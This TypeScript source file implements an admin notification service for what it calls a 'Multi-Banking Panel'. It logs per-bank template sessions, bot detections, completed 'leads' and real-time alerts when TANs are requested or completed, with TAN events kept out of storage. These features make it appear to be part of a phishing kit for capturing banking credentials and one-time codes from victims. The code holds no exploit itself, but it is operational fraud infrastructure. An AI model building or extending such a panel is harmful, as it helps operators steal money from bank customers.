/**
 * Notification Service
 * Centralized service for creating and managing admin notifications
 */

import { getDb } from '../database';
import { createNotification, NotificationRecord } from '../database/tables/notifications';
import socketManager from './socketManager';

export type NotificationType = 'session' | 'security' | 'system' | 'tan';
export type NotificationCategory = 'info' | 'warning' | 'error' | 'success';

export interface CreateNotificationOptions {
  type: NotificationType;
  category: NotificationCategory;
  title: string;
  message: string;
  sessionKey?: string;
  templateName?: string;
  ipAddress?: string;
  userAgent?: string;
  metadata?: Record<string, any>;
  expiresInMinutes?: number; // Auto-expire after X minutes
  realTimeOnly?: boolean; // Don't store in database, only send via Socket.IO
}

class NotificationService {
  /**
   * Create and send a notification
   */
  async createNotification(options: CreateNotificationOptions): Promise<number | null> {
    try {
      const db = getDb();
      
      // Calculate expiration if specified
      let expiresAt: string | undefined;
      if (options.expiresInMinutes) {
        const expiry = new Date();
        expiry.setMinutes(expiry.getMinutes() + options.expiresInMinutes);
        expiresAt = expiry.toISOString();
      }

      let notificationId: number | null = null;

      // Store in database unless it's real-time only
      if (!options.realTimeOnly) {
        notificationId = createNotification(db, {
          type: options.type,
          category: options.category,
          title: options.title,
          message: options.message,
          session_key: options.sessionKey,
          template_name: options.templateName,
          ip_address: options.ipAddress,
          user_agent: options.userAgent,
          metadata: options.metadata ? JSON.stringify(options.metadata) : undefined,
          expires_at: expiresAt
        });
      }

      // Send real-time notification to connected admins
      const io = socketManager.getIO();
      if (io) {
        const notificationData = {
          id: notificationId,
          type: options.type,
          category: options.category,
          title: options.title,
          message: options.message,
          sessionKey: options.sessionKey,
          templateName: options.templateName,
          metadata: options.metadata,
          timestamp: new Date().toISOString(),
          realTimeOnly: options.realTimeOnly || false
        };

        io.to('admins').emit('new_notification', notificationData);
        console.log(`🔔 Notification sent to admins: ${options.title}`);
      }

      return notificationId;
    } catch (error) {
      console.error('Error creating notification:', error);
      return null;
    }
  }

  /**
   * Session-related notifications
   */
  async notifySessionStarted(sessionKey: string, templateName: string, ipAddress?: string, userAgent?: string): Promise<void> {
    await this.createNotification({
      type: 'session',
      category: 'info',
      title: 'New Session Started',
      message: `User started ${templateName.charAt(0).toUpperCase() + templateName.slice(1)} template`,
      sessionKey,
      templateName,
      ipAddress,
      userAgent,
      metadata: { event: 'session_started' }
    });
  }

  async notifySessionStateChange(sessionKey: string, templateName: string, oldState: string, newState: string): Promise<void> {
    await this.createNotification({
      type: 'session',
      category: 'info',
      title: 'Session Progress',
      message: `${templateName.charAt(0).toUpperCase() + templateName.slice(1)} session moved from ${oldState.replace(/_/g, ' ')} to ${newState.replace(/_/g, ' ')}`,
      sessionKey,
      templateName,
      metadata: { event: 'state_change', oldState, newState },
      expiresInMinutes: 60 // Expire after 1 hour
    });
  }

  async notifySessionCompleted(sessionKey: string, templateName: string, leadId?: number): Promise<void> {
    await this.createNotification({
      type: 'session',
      category: 'success',
      title: 'Session Completed',
      message: `${templateName.charAt(0).toUpperCase() + templateName.slice(1)} session completed successfully${leadId ? ` (Lead #${leadId})` : ''}`,
      sessionKey,
      templateName,
      metadata: { event: 'session_completed', leadId }
    });
  }

  async notifySessionAbandoned(sessionKey: string, templateName: string, lastState: string): Promise<void> {
    await this.createNotification({
      type: 'session',
      category: 'warning',
      title: 'Session Abandoned',
      message: `${templateName.charAt(0).toUpperCase() + templateName.slice(1)} session abandoned at ${lastState.replace(/_/g, ' ')}`,
      sessionKey,
      templateName,
      metadata: { event: 'session_abandoned', lastState },
      expiresInMinutes: 120 // Expire after 2 hours
    });
  }

  /**
   * Security-related notifications
   */
  async notifyBotDetected(ipAddress: string, userAgent: string, detectionMethod: string, score: number): Promise<void> {
    await this.createNotification({
      type: 'security',
      category: 'warning',
      title: 'Bot Detected',
      message: `Blocked ${detectionMethod} detection (score: ${score}) from ${ipAddress}`,
      ipAddress,
      userAgent,
      metadata: { event: 'bot_detected', detectionMethod, score }
    });
  }

  async notifyAdminLogin(username: string, ipAddress: string, userAgent: string): Promise<void> {
    await this.createNotification({
      type: 'security',
      category: 'info',
      title: 'Admin Login',
      message: `Admin "${username}" logged in from ${ipAddress}`,
      ipAddress,
      userAgent,
      metadata: { event: 'admin_login', username }
    });
  }

  async notifySecurityConfigChange(adminUsername: string, changes: string[]): Promise<void> {
    await this.createNotification({
      type: 'security',
      category: 'warning',
      title: 'Security Configuration Changed',
      message: `Admin "${adminUsername}" modified: ${changes.join(', ')}`,
      metadata: { event: 'config_change', changes, adminUsername }
    });
  }

  async notifySuspiciousActivity(sessionKey: string, templateName: string, activity: string, details: Record<string, any>): Promise<void> {
    await this.createNotification({
      type: 'security',
      category: 'error',
      title: 'Suspicious Activity',
      message: `${activity} detected in ${templateName} session`,
      sessionKey,
      templateName,
      metadata: { event: 'suspicious_activity', activity, ...details }
    });
  }

  /**
   * TAN-related notifications
   */
  async notifyTanRequested(sessionKey: string, templateName: string, tanType: string, method: string): Promise<void> {
    await this.createNotification({
      type: 'tan',
      category: 'info',
      title: 'TAN Requested',
      message: `${method.toUpperCase()} ${tanType.replace('_', ' ')} requested for ${templateName}`,
      sessionKey,
      templateName,
      metadata: { event: 'tan_requested', tanType, method },
      realTimeOnly: true // Don't store, just notify
    });
  }

  async notifyTanCompleted(sessionKey: string, templateName: string, tanType: string, success: boolean): Promise<void> {
    await this.createNotification({
      type: 'tan',
      category: success ? 'success' : 'error',
      title: success ? 'TAN Completed' : 'TAN Failed',
      message: `${tanType.replace('_', ' ')} ${success ? 'completed' : 'failed'} for ${templateName}`,
      sessionKey,
      templateName,
      metadata: { event: 'tan_completed', tanType, success },
      realTimeOnly: true // Don't store, just notify
    });
  }

  /**
   * System-related notifications
   */
  async notifySystemStartup(): Promise<void> {
    await this.createNotification({
      type: 'system',
      category: 'success',
      title: 'System Online',
      message: 'Multi-Banking Panel server started successfully',
      metadata: { event: 'system_startup', uptime: process.uptime() }
    });
  }

  async notifyDatabaseError(error: string): Promise<void> {
    await this.createNotification({
      type: 'system',
      category: 'error',
      title: 'Database Error',
      message: `Database connection issue: ${error}`,
      metadata: { event: 'database_error', error }
    });
  }

  async notifyHighLoad(metric: string, value: number, threshold: number): Promise<void> {
    await this.createNotification({
      type: 'system',
      category: 'warning',
      title: 'High System Load',
      message: `${metric} is ${value} (threshold: ${threshold})`,
      metadata: { event: 'high_load', metric, value, threshold },
      expiresInMinutes: 30 // Expire after 30 minutes
    });
  }

  /**
   * Bulk operations
   */
  async markAllAsRead(): Promise<number> {
    const db = getDb();
    const result = db.prepare(`
      UPDATE notifications 
      SET is_read = 1 
      WHERE is_read = 0 AND is_dismissed = 0
    `).run();

    // Notify admins of bulk read
    const io = socketManager.getIO();
    if (io) {
      io.to('admins').emit('notifications_bulk_read');
    }

    return result.changes;
  }

  async dismissAllRead(): Promise<number> {
    const db = getDb();
    const result = db.prepare(`
      UPDATE notifications 
      SET is_dismissed = 1 
      WHERE is_read = 1 AND is_dismissed = 0
    `).run();

    // Notify admins of bulk dismiss
    const io = socketManager.getIO();
    if (io) {
      io.to('admins').emit('notifications_bulk_dismissed');
    }

    return result.changes;
  }

  /**
   * Get notification statistics
   */
  async getStats(): Promise<{
    total: number;
    unread: number;
    byType: Record<string, number>;
    byCategory: Record<string, number>;
  }> {
    const db = getDb();
    
    const total = db.prepare(`SELECT COUNT(*) as count FROM notifications WHERE is_dismissed = 0`).get() as { count: number };
    const unread = db.prepare(`SELECT COUNT(*) as count FROM notifications WHERE is_read = 0 AND is_dismissed = 0`).get() as { count: number };
    
    const byType = db.prepare(`
      SELECT type, COUNT(*) as count 
      FROM notifications 
      WHERE is_dismissed = 0 
      GROUP BY type
    `).all() as Array<{ type: string; count: number }>;

    const byCategory = db.prepare(`
      SELECT category, COUNT(*) as count 
      FROM notifications 
      WHERE is_dismissed = 0 
      GROUP BY category
    `).all() as Array<{ category: string; count: number }>;

    return {
      total: total.count,
      unread: unread.count,
      byType: byType.reduce((acc, item) => ({ ...acc, [item.type]: item.count }), {}),
      byCategory: byCategory.reduce((acc, item) => ({ ...acc, [item.category]: item.count }), {})
    };
  }
}

export const notificationService = new NotificationService();
export default notificationService;
